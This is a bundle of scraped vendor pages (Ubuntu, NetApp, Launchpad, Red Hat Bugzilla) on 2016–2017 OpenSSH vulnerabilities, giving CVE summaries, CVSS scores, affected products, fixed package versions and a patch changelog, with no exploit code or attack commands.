* [openssh-server](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:7.2p2-4ubuntu2.4](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A7.2p2-4ubuntu2.4)

##### Ubuntu 14.04

* [openssh-server](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:6.6p1-2ubuntu2.10](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A6.6p1-2ubuntu2.10)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2016-10009](/security/CVE-2016-10009)
* [CVE-2016-10010](/security/CVE-2016-10010)
* [CVE-2016-10011](/security/CVE-2016-10011)
* [CVE-2016-10012](/security/CVE-2016-10012)
* [CVE-2017-15906](/security/CVE-2017-15906)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from security.netapp.com_d8fc9570_20250125_103003.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English


[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [January 2017 OpenSSH Vulnerabilities in NetApp Products](https://security.netapp.com/advisory/ntap-20171130-0002)

## January 2017 OpenSSH Vulnerabilities in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close 

#### Subscribe to NTAP-20171130-0002 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20171130-0002 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close 

#### Unsubscribe from NTAP-20171130-0002 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20171130-0002 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20171130-0002
**Version:**
12.0

**Last updated:**
09/01/2020

**Status:**
Final.

**CVEs:** CVE-2016-10012, CVE-2016-10011, CVE-2016-10010, CVE-2016-10009

Overview
#### Summary

Multiple NetApp products incorporate the OpenSSH software libraries. OpenSSH versions below 7.4 are susceptible to vulnerabilities that may be exploited to obtain sensitive information or allow local users to escalate privileges. This advisory will be updated as additional information becomes available.

#### Impact

Successful exploitation of these vulnerabilities can lead to sensitive information disclosure or local user privilege escalation.

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2016-10009](https://nvd.nist.gov/vuln/detail/CVE-2016-10009) | 7.3 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L |
| [CVE-2016-10010](https://nvd.nist.gov/vuln/detail/CVE-2016-10010) | 7.0 (HIGH) | CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2016-10011](https://nvd.nist.gov/vuln/detail/CVE-2016-10011) | 5.5 (MEDIUM) | CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| [CVE-2016-10012](https://nvd.nist.gov/vuln/detail/CVE-2016-10012) | 7.8 (HIGH) | CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <https://www.openssh.com/txt/release-7.4>
* <https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10012>
* <https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10011>
* <https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10010>
* <https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10009>

Affected Products
#### Affected Products

* Cluster Network Switch (NetApp CN1610)
* Clustered Data ONTAP
* Data ONTAP operating in 7-Mode
* Management Network Switch (NetApp CN1601)
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SteelStore Cloud Integrated Storage
* NetApp VASA Provider for Clustered Data ONTAP 7.2 and above
* ONTAP Select Deploy administration utility
* OnCommand Balance
* OnCommand Unified Manager for 7-Mode (core package)

#### Products Not Affected

* 7-Mode Transition Tool
* ATTO FibreBridge
* Brocade Fabric Operating System Firmware
* Brocade Network Advisor Software
* Clustered Data ONTAP Antivirus Connector
* E-Series SANtricity Storage Manager
* E-Series SANtricity Web Services (REST API) for Web Services Proxy
* FAS/AFF BIOS
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp Cloud Backup (formerly AltaVault)
* NetApp Cloud Backup OST Plug-in (formerly AltaVault OST Plug-in)
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp Plug-in for Symantec NetBackup
* NetApp SANtricity SMI-S Provider
* NetApp SMI-S Provider
* NetApp Service Level Manager
* NetApp Storage Encryption
* OnCommand API Services
* OnCommand Cloud Manager
* OnCommand Insight
* OnCommand Performance Manager (Unified Manager Performance Pkg)
* OnCommand System Manager 9.x
* OnCommand Unified Manager for Clustered Data ONTAP
* OnCommand Workflow Automation
* Open Systems SnapVault Agent
* RAID Controller CTS2600 Legacy Engenio
* Service Processor
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapDrive for Unix
* SnapDrive for Windows
* SnapManager for Exchange
* SnapManager for Hyper-V
* SnapManager for MS SQL
* SnapManager for Oracle
* SnapManager for SAP
* SnapManager for Sharepoint
* Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 7.2 and above
* Storage Services Connector
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID9 (9.x and prior)
* System Setup
* Virtual Storage Console for VMware vSphere 7.2 and above

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **ONTAP Select Deploy administration utility** | <https://mysupport.netapp.com/NOW/download/software/ontap_select/9.3.26/> |
| **NetApp SteelStore Cloud Integrated Storage** | NetApp SteelStore Cloud Integrated Storage has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2397079.html) for more information. |
| **OnCommand Unified Manager for 7-Mode (core package)** | OnCommand Unified Manager for 7-Mode (core package) has no plans to address this vulnerability. |
| **NetApp VASA Provider for Clustered Data ONTAP 7.2 and above** | <https://mysupport.netapp.com/NOW/download/software/vasa_cdot/7.2/> |
| **Clustered Data ONTAP** | <https://mysupport.netapp.com/download/software/ontap/9.3P6/> |
| **NetApp SolidFire & HCI Storage Node (Element Software)** | <https://mysupport.netapp.com/products/solidfire/11.0/> |
| **OnCommand Balance** | OnCommand Balance has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMP1655122.html) for more information. |
| **Management Network Switch (NetApp CN1601)** | Management Network Switch (NetApp CN1601) has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2838313.html) for more information. |
| **Cluster Network Switch (NetApp CN1610)** | <https://mysupport.netapp.com/NOW/download/software/sanswitch/fcp/NetApp/cn1610cm> |
| **Data ONTAP operating in 7-Mode** | <http://mysupport.netapp.com/NOW/download/software/ontap/8.2.5/> |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20171130-0002>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20171130 | Initial Public Release |
| 2.0 | 20180119 | OnCommand Balance moved to Won't Fix status |
| 3.0 | 20180410 | StorageGRID Webscale moved from Affected Products to Products not Affected after investigation |
| 4.0 | 20180601 | Clustered Data ONTAP and OnCommand Unified Manager for 7-Mode (core package) moved to Affected Products |
| 5.0 | 20180621 | OnCommand Unified Manager for 7-Mode (core package) moved to Won't Fix status |
| 6.0 | 20180712 | ONTAP Select Deploy administration utility added to Software Versions and Fixes |
| 7.0 | 20180717 | NetApp VASA Provider for Clustered Data ONTAP 7.0 and above added to Software Versions and Fixes |
| 8.0 | 20180823 | Cluster Network Switch (NetApp CN1610) added to Software Versions and Fixes |
| 9.0 | 20180911 | Clustered Data ONTAP added to Software Versions and Fixes |
| 10.0 | 20181211 | Element Software (formerly SolidFire Element OS) added to Software Versions and Fixes |
| 11.0 | 20190212 | NetApp Cloud Backup (formerly AltaVault) moved to Products Not Affected |
| 12.0 | 20200901 | NetApp SteelStore Cloud Integrated Storage moved to Won't Fix status, Final status |

This document is provided solely for informational purposes. All information is based upon NetApps current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp.  2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

   NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from launchpad.net_8ee8f3af_20250126_080145.html ===

[Log in / Register](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A6.6p1-2ubuntu2.10/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[openssh package](https://launchpad.net/ubuntu/%2Bsource/openssh)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/openssh)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/openssh)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/openssh)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/openssh)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/openssh)

# openssh 1:6.6p1-2ubuntu2.10 source package in Ubuntu

## Changelog

```
openssh (1:6.6p1-2ubuntu2.10) trusty-security; urgency=medium

  * SECURITY UPDATE: untrusted search path when loading PKCS#11 modules
    - debian/patches/CVE-2016-10009.patch: add a whitelist of paths from
      which ssh-agent will load a PKCS#11 module in ssh-agent.1,
      ssh-agent.c.
    - debian/patches/CVE-2016-10009-2.patch: fix deletion of PKCS#11 keys
      in ssh-agent.c.
    - debian/patches/CVE-2016-10009-3.patch: relax whitelist in
      ssh-agent.c.
    - debian/patches/CVE-2016-10009-4.patch: add missing label in
      ssh-agent.c.
    - CVE-2016-10009
  * SECURITY UPDATE: local information disclosure via effects of realloc on
    buffer contents
    - debian/patches/CVE-2016-10011.patch: pre-allocate the buffer used for
      loading keys in authfile.c.
    - CVE-2016-10011
  * SECURITY UPDATE: local privilege escalation via incorrect bounds check
    in shared memory manager
    - debian/patches/CVE-2016-10012-1-2.patch: remove support for
      pre-authentication compression in kex.c, kex.h, Makefile.in,
      monitor.c, monitor.h, monitor_wrap.c, monitor_wrap.h, myproposal.h,
      packet.c, servconf.c, sshd.c, sshd_config.5.
    - debian/patches/CVE-2016-10012-3.patch: put back some pre-auth zlib
      bits in kex.c, kex.h, packet.c.
    - CVE-2016-10012
  * SECURITY UPDATE: DoS via zero-length file creation in readonly mode
    - debian/patches/CVE-2017-15906.patch: disallow creation of empty files
      in sftp-server.c.
    - CVE-2017-15906

 -- Marc Deslauriers <email address hidden>  Mon, 15 Jan 2018 11:28:55 -0500
```

## Upload details

Uploaded by:
[Marc Deslauriers](/~mdeslaur)
on 2018-01-18

Uploaded to:
[Trusty](/ubuntu/trusty)

Original maintainer:
[Ubuntu Developers](/~ubuntu-devel-discuss-lists)

Architectures:
any all

Section:
net

Urgency:
Medium Urgency

## [See full publishing history](%2Bpublishinghistory) Publishing

| Series | Pocket | Published | Component | Section |
| --- | --- | --- | --- | --- |

## Builds

[Trusty](/ubuntu/trusty):
![[FULLYBUILT]](/@@/build-success "Successfully built")
[amd64](/~ubuntu-security-proposed/%2Barchive/ubuntu/ppa/%2Bbuild/14251520)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[arm64](/~ubuntu-security-proposed/%2Barchive/ubuntu/ppa/%2Bbuild/14251521)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[armhf](/~ubuntu-security-proposed/%2Barchive/ubuntu/ppa/%2Bbuild/14251522)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[i386](/~ubuntu-security-proposed/%2Barchive/ubuntu/ppa/%2Bbuild/14251523)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[powerpc](/~ubuntu-security-proposed/%2Barchive/ubuntu/ppa/%2Bbuild/14251524)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[ppc64el](/~ubuntu-security-proposed/%2Barchive/ubuntu/ppa/%2Bbuild/14251525)

## Downloads

| File | Size | SHA-256 Checksum |
| --- | --- | --- |
| [openssh\_6.6p1.orig.tar.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/openssh/1%3A6.6p1-2ubuntu2.10/openssh_6.6p1.orig.tar.gz) | 1.2 MiB | 48c1f0664b4534875038004cc4f3555b8329c2a81c1df48db5c517800de203bb |
| [openssh\_6.6p1-2ubuntu2.10.debian.tar.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/openssh/1%3A6.6p1-2ubuntu2.10/openssh_6.6p1-2ubuntu2.10.debian.tar.gz) | 194.3 KiB | 1b77259775baebdc0a74e0edc7b74d3ed5d781ed0a9040b46cca55f2bc4b6b73 |
| [openssh\_6.6p1-2ubuntu2.10.dsc](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/openssh/1%3A6.6p1-2ubuntu2.10/openssh_6.6p1-2ubuntu2.10.dsc) | 2.6 KiB | 8e65cd7f7001915ce9c3574a7218aa9d1d304ecff6d93132a24fffa39c8deecf |

### Available diffs

* [diff from 1:6.6p1-2ubuntu2.8 (in ~ubuntu-security/ubuntu/ppa) to 1:6.6p1-2ubuntu2.10](http://launchpadlibrarian.net/354283699/openssh_1%3A6.6p1-2ubuntu2.8_1%3A6.6p1-2ubuntu2.10.diff.gz) (8.9 KiB)
* [diff from 1:6.6p1-2ubuntu2.9 to 1:6.6p1-2ubuntu2.10](http://launchpadlibrarian.net/353882002/openssh_1%3A6.6p1-2ubuntu2.9_1%3A6.6p1-2ubuntu2.10.diff.gz) (2.1 KiB)

[View changes file](http://launchpadlibrarian.net/353881970/openssh_6.6p1-2ubuntu2.10_source.changes)

## Binary packages built by this source

[openssh-client](/ubuntu/trusty/%2Bpackage/openssh-client):
secure shell (SSH) client, for secure access to remote machines

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

Ssh (Secure Shell) is a program for logging into a remote machine

and for executing commands on a remote machine.

It provides secure encrypted communications between two untrusted

hosts over an insecure network. X11 connections and arbitrary TCP/IP

ports can also be forwarded over the secure channel.

It can be used to provide applications with a secure communication

channel.

.

This package provides the ssh, scp and sftp clients, the ssh-agent

and ssh-add programs to make public key authentication more convenient,

and the ssh-keygen, ssh-keyscan, ssh-copy-id and ssh-argv0 utilities.

.

In some countries it may be illegal to use any encryption at all

without a special permit.

.

ssh replaces the insecure rsh, rcp and rlogin programs, which are

obsolete for most purposes.

[openssh-client-dbgsym](/ubuntu/trusty/%2Bpackage/openssh-client-dbgsym):
debug symbols for package openssh-client

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

Ssh (Secure Shell) is a program for logging into a remote machine

and for executing commands on a remote machine.

It provides secure encrypted communications between two untrusted

hosts over an insecure network. X11 connections and arbitrary TCP/IP

ports can also be forwarded over the secure channel.

It can be used to provide applications with a secure communication

channel.

.

This package provides the ssh, scp and sftp clients, the ssh-agent

and ssh-add programs to make public key authentication more convenient,

and the ssh-keygen, ssh-keyscan, ssh-copy-id and ssh-argv0 utilities.

.

In some countries it may be illegal to use any encryption at all

without a special permit.

.

ssh replaces the insecure rsh, rcp and rlogin programs, which are

obsolete for most purposes.

[openssh-client-udeb](/ubuntu/trusty/%2Bpackage/openssh-client-udeb):
secure shell client for the Debian installer

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

This package provides the ssh client for use in debian-installer.

[openssh-client-udeb-dbgsym](/ubuntu/trusty/%2Bpackage/openssh-client-udeb-dbgsym):
debug symbols for package openssh-client-udeb

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

This package provides the ssh client for use in debian-installer.

[openssh-server](/ubuntu/trusty/%2Bpackage/openssh-server):
secure shell (SSH) server, for secure access from remote machines

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

Ssh (Secure Shell) is a program for logging into a remote machine

and for executing commands on a remote machine.

It provides secure encrypted communications between two untrusted

hosts over an insecure network. X11 connections and arbitrary TCP/IP

ports can also be forwarded over the secure channel.

It can be used to provide applications with a secure communication

channel.

.

This package provides the sshd server.

.

In some countries it may be illegal to use any encryption at all

without a special permit.

.

sshd replaces the insecure rshd program, which is obsolete for most

purposes.

[openssh-server-dbgsym](/ubuntu/trusty/%2Bpackage/openssh-server-dbgsym):
debug symbols for package openssh-server

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

Ssh (Secure Shell) is a program for logging into a remote machine

and for executing commands on a remote machine.

It provides secure encrypted communications between two untrusted

hosts over an insecure network. X11 connections and arbitrary TCP/IP

ports can also be forwarded over the secure channel.

It can be used to provide applications with a secure communication

channel.

.

This package provides the sshd server.

.

In some countries it may be illegal to use any encryption at all

without a special permit.

.

sshd replaces the insecure rshd program, which is obsolete for most

purposes.

[openssh-server-udeb](/ubuntu/trusty/%2Bpackage/openssh-server-udeb):
secure shell server for the Debian installer

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

This package provides the sshd server for use in debian-installer.

Since it is expected to be used in specialized situations (e.g. S/390

installs with no console), it does not provide any configuration.

[openssh-server-udeb-dbgsym](/ubuntu/trusty/%2Bpackage/openssh-server-udeb-dbgsym):
debug symbols for package openssh-server-udeb

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

This package provides the sshd server for use in debian-installer.

Since it is expected to be used in specialized situations (e.g. S/390

installs with no console), it does not provide any configuration.

[openssh-sftp-server](/ubuntu/trusty/%2Bpackage/openssh-sftp-server):
secure shell (SSH) sftp server module, for SFTP access from remote machines

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

Ssh (Secure Shell) is a program for logging into a remote machine

and for executing commands on a remote machine.

It provides secure encrypted communications between two untrusted

hosts over an insecure network. X11 connections and arbitrary TCP/IP

ports can also be forwarded over the secure channel.

It can be used to provide applications with a secure communication

channel.

.

This package provides the SFTP server module for the SSH server. It

is needed if you want to access your SSH server with SFTP. The SFTP

server module also works with other SSH daemons like dropbear.

[openssh-sftp-server-dbgsym](/ubuntu/trusty/%2Bpackage/openssh-sftp-server-dbgsym):
debug symbols for package openssh-sftp-server

This is the portable version of OpenSSH, a free implementation of

the Secure Shell protocol as specified by the IETF secsh working

group.

.

Ssh (Secure Shell) is a program for logging into a remote machine

and for executing commands on a remote machine.

It provides secure encrypted communications between two untrusted

hosts over an insecure network. X11 connections and arbitrary TCP/IP

ports can also be forwarded over the secure channel.

It can be used to provide applications with a secure communication

channel.

.

This package provides the SFTP server module for the SSH server. It

is needed if you want to access your SSH server with SFTP. The SFTP

server module also works with other SSH daemons like dropbear.

[ssh](/ubuntu/trusty/%2Bpackage/ssh):
secure shell client and server (metapackage)

This metapackage is a convenient way to install both the OpenSSH client

and the OpenSSH server. It provides nothing in and of itself, so you

may remove it if nothing depends on it.

[ssh-askpass-gnome](/ubuntu/trusty/%2Bpackage/ssh-askpass-gnome):
interactive X program to prompt users for a passphrase for ssh-add

This has been split out of the main openssh-client package so that

openssh-client does not need to depend on GTK+.

.

You probably want the ssh-askpass package instead, but this is

provided to add to your choice and/or confusion.

[ssh-askpass-gnome-dbgsym](/ubuntu/trusty/%2Bpackage/ssh-askpass-gnome-dbgsym):
debug symbols for package ssh-askpass-gnome

This has been split out of the main openssh-client package so that

openssh-client does not need to depend on GTK+.

.

You probably want the ssh-askpass package instead, but this is

provided to add to your choice and/or confusion.

[ssh-krb5](/ubuntu/trusty/%2Bpackage/ssh-krb5):
secure shell client and server (transitional package)

This is a transitional package depending on the regular Debian OpenSSH

client and server, which now support GSSAPI natively. It will add the

necessary GSSAPI options to the server configuration file. You can

remove it once the upgrade is complete and nothing depends on it.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)

[Take the tour](https://launchpad.net/%2Btour)

[Read the guide](https://help.launchpad.net/)

 2004
[CanonicalLtd.](http://canonical.com/)

[Terms of use](https://launchpad.net/legal)

[Data privacy](https://www.ubuntu.com/legal/dataprivacy)

[Contact Launchpad Support](/feedback)

[Blog](http://blog.launchpad.net/)

[Careers](https://canonical.com/careers)

[System status](https://ubuntu.social/%40launchpadstatus)

4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugzilla.redhat.com_4b3ca071_20250126_080201.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1406269)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1406269)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1406269)+ Login using a Red Hat Bugzilla account
  + ForgotPassword
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla  Bug1406269

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug1406269**](show_bug.cgi?id=1406269)
(CVE-2016-10009)
- [CVE-2016-10009](https://access.redhat.com/security/cve/CVE-2016-10009) openssh: loading of untrusted PKCS#11 modules in ssh-agent

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2016-10009 openssh: loading of untrusted PKCS#11 modules in ssh-agent

